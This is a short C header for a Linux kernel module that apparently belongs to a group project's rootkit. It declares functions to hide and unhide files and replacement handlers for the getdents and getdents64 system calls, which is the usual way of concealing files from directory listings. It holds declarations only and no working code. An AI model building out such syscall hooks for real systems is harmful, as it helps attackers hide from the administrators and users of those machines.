#ifndef _GROUP7_FILEHIDE_H
#define _GROUP7_FILEHIDE_H

#include <linux/types.h>
#include <linux/dirent.h>
#include <linux/syscalls.h>


void hide_files(void);
void unhide_files(void);

asmlinkage long filehide_getdents(unsigned, struct linux_dirent __user *, unsigned);
asmlinkage long filehide_getdents64(unsigned, struct linux_dirent64 __user *, unsigned);

#endif//_GROUP7_FILEHIDE_H
